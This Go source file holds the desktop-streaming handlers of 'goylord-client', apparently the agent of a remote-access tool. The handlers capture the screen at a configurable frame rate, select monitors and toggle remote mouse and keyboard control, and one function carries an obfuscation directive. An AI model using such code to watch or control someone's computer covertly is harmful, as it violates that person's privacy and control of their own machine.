package handlers

import (
	"context"
	"log"
	"goylord-client/cmd/agent/capture"
	rt "goylord-client/cmd/agent/runtime"
	"sync"
	"sync/atomic"
	"time"
)

var (
	persistedDisplayValue int
	persistedDisplayMu    sync.Mutex
	desktopTargetFPS      atomic.Int64
)

func persistDisplaySelection(display int) {
	persistedDisplayMu.Lock()
	persistedDisplayValue = display
	persistedDisplayMu.Unlock()
}

func GetPersistedDisplay() int {
	persistedDisplayMu.Lock()
	defer persistedDisplayMu.Unlock()
	return persistedDisplayValue
}

func DesktopStart(ctx context.Context, env *rt.Env) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	fps := activeDesktopTargetFPS()
	interval := time.Second / time.Duration(fps)
	capture.SetH264TargetFPS(fps)
	capture.SetFrameFlowTargetFPS(fps)
	log.Printf("desktop: starting stream (target fps %d)", fps)
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	currentFPS := fps
	for {
		select {
		case <-ctx.Done():
			log.Printf("desktop: stopping stream")
			return nil
		case <-ticker.C:
			fps := activeDesktopTargetFPS()
			if fps != currentFPS {
				currentFPS = fps
				capture.SetH264TargetFPS(fps)
				capture.SetFrameFlowTargetFPS(fps)
				ticker.Reset(time.Second / time.Duration(fps))
				log.Printf("desktop: target fps changed to %d", fps)
			}
			if err := capture.Now(ctx, env); err != nil {
				if ctx.Err() != nil {
					log.Printf("desktop: stopping stream")
					return nil
				}
				log.Printf("desktop: capture error: %v", err)
			}
		}
	}
}

func activeDesktopTargetFPS() int {
	if fps := int(desktopTargetFPS.Load()); fps > 0 {
		return fps
	}
	_, fps := streamInterval("GOYLORD_DESKTOP_MAX_FPS", 120)
	return SetDesktopTargetFPS(fps)
}

func SetDesktopTargetFPS(fps int) int {
	fps = clampDesktopTargetFPS(fps)
	desktopTargetFPS.Store(int64(fps))
	capture.SetH264TargetFPS(fps)
	capture.SetFrameFlowTargetFPS(fps)
	return fps
}

func clampDesktopTargetFPS(fps int) int {
	if fps < 1 {
		return 1
	}
	if fps > 240 {
		return 240
	}
	return fps
}

func DesktopSelect(ctx context.Context, env *rt.Env, display int) error {
	env.DesktopMu.Lock()
	prev := env.SelectedDisplay
	env.DesktopMu.Unlock()
	maxDisplays := capture.MonitorCount()
	if display < 0 || display >= maxDisplays {
		log.Printf("desktop: WARNING - requested display %d out of range (0-%d), clamping to 0", display, maxDisplays-1)
		display = 0
	}
	env.DesktopMu.Lock()
	env.SelectedDisplay = display
	env.DesktopMu.Unlock()

	persistDisplaySelection(display)
	if prev != display {
		capture.ResetPrev()
		capture.ResetDesktopCapture()
	}
	log.Printf("desktop: set selected display from %d to %d (reported monitors=%d, will capture monitor at index %d)", prev, display, maxDisplays, display)
	return nil
}

func DesktopMouseControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.DesktopMu.Lock()
	env.MouseControl = enabled
	env.DesktopMu.Unlock()
	return nil
}

func DesktopKeyboardControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.DesktopMu.Lock()
	env.KeyboardControl = enabled
	env.DesktopMu.Unlock()
	return nil
}

func DesktopCursorControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.CursorCapture = enabled
	capture.SetCursorCapture(enabled)
	return nil
}

func DesktopDuplicationControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.DesktopDuplication = enabled
	capture.SetDesktopDuplication(enabled)
	capture.ResetPrev()
	capture.ResetDesktopCapture()
	capture.ResetMonitorCache()
	return nil
}
